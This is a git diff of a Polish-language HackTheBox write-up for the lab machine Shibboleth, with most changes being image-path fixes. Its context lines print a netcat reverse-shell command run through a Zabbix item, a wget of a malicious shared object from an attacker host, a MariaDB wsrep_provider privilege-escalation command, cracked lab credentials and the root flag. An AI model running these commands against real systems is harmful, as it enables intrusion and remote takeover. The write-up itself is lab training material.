@@ -327,7 +327,7 @@ PORT   STATE SERVICE VERSION
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 </code></pre></div><hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211125224918.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211125224918.png" alt=""  />
 </p>
 <hr>
 <h2 id="informacje">Informacje<a hidden class="anchor" aria-hidden="true" href="#informacje">#</a></h2>
@@ -335,7 +335,7 @@ PORT   STATE SERVICE VERSION
 Theme:	FlexStart - v1.2.0</p>
 <hr>
 <h2 id="forms">forms<a hidden class="anchor" aria-hidden="true" href="#forms">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211125230206.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211125230206.png" alt=""  />
 </p>
 <p><code>readme.txt</code></p>
 <pre tabindex="0"><code>Fully working PHP/AJAX contact form script is available in the pro version of the template.
@@ -358,18 +358,18 @@ Found: 2008.shibboleth.htb <span style="color:#f92672">(</span>Status: 302<span 
 <h2 id="subdomain-monitor">Subdomain monitor<a hidden class="anchor" aria-hidden="true" href="#subdomain-monitor">#</a></h2>
 <hr>
 <h2 id="subdomain-zabbix">Subdomain zabbix<a hidden class="anchor" aria-hidden="true" href="#subdomain-zabbix">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211126011955.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211126011955.png" alt=""  />
 </p>
 <p>W kodzie źródłowym znalazłem odnośnik, który może sugerować, że to <code>Zabbix 5.0</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211126024320.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211126024320.png" alt=""  />
 </p>
 <p>Możliwe, że jest nawet jakiś exploit na tą wersje.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211126024447.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211126024447.png" alt=""  />
 </p>
 <p>Niestety, exploit jest <code>Authenticated</code>, czyli nie użyjemy go bez danych logowania</p>
 <hr>
 <h1 id="ponowny-nmap">Ponowny nmap<a hidden class="anchor" aria-hidden="true" href="#ponowny-nmap">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211129112745.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211129112745.png" alt=""  />
 </p>
 <p>Jak się okazało skanowanie nmapem nie ukazało wszystkich portów. Jest jeszcze jeden port UDP, który jest otwarty.</p>
 <h3 id="skan-nmap-po-portach-udp">Skan nmap po portach UDP<a hidden class="anchor" aria-hidden="true" href="#skan-nmap-po-portach-udp">#</a></h3>
@@ -424,20 +424,20 @@ Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display al
 Session completed
 </code></pre></div><p>Zatem mamy pewne dane logowania: <code>Administrator:ilovepumkinpie1</code></p>
 <p>Hasło faktycznie pasuje do Zabbixa</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211129215038.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211129215038.png" alt=""  />
 </p>
 <hr>
 <h1 id="payload">Payload<a hidden class="anchor" aria-hidden="true" href="#payload">#</a></h1>
 <p>Tutaj długo szukałem różnych rozwiązań i możliwości. Po pomocy jednego z użytkowników forum znalazłem, że należały stworzyć nowy <code>Item</code>, gdzie można wykonać określoną komendę.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211203234028.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234028.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211203234200.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234200.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">system.run<span style="color:#f92672">[</span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.156 <span style="color:#ae81ff">9001</span> &gt;/tmp/f &amp;,nowait<span style="color:#f92672">]</span>
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211203234209.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234209.png" alt=""  />
 </p>
 <p>Nasłuchiwanie na porcie 9001, otrzymujemy shell.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211203234525.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234525.png" alt=""  />
 </p>
 <hr>
 <h1 id="user">User<a hidden class="anchor" aria-hidden="true" href="#user">#</a></h1>
@@ -525,7 +525,7 @@ DBPassword<span style="color:#f92672">=</span>bloooarskybluh
 <p><code>zabbix:bloooarskybluh</code></p>
 <hr>
 <h2 id="mariadb">MariaDB<a hidden class="anchor" aria-hidden="true" href="#mariadb">#</a></h2>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211213010104.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211213010104.png" alt=""  />
 </p>
 <p>Po wpisaniu otrzymałem dostęp do bazy danych.</p>
 <p>Teraz kilka komend, by odnaleźć jakieś ciekawe informacje w bazie</p>
@@ -555,7 +555,7 @@ You can turn <span style="color:#66d9ef">off</span> this feature <span style="co
 <hr>
 <h2 id="linux-exploit-suggester">Linux Exploit Suggester<a hidden class="anchor" aria-hidden="true" href="#linux-exploit-suggester">#</a></h2>
 <p>Postanowiłem sprawdzić maszynę pod kątem jakichś statycznych podatności. Użyłem do tego <code>Linux Exploit Suggester</code>. Efekt skanu:</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211213012711.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211213012711.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">uname -a
 
@@ -585,7 +585,7 @@ wget http://10.10.14.174/test.so
 mysql -u zabbix -p -e <span style="color:#e6db74">&#39;SET GLOBAL wsrep_provider=&#34;/tmp/pp/test.so&#34;;&#39;</span>
 bloooarskybluh
 </code></pre></div><p>I podczas nasłuchiwania na porcie 9002 otrzymujemy połączenie</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211213022452.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211213022452.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>9bdfeddc05b1e2c6078d24b9c4a8f756</code></p>
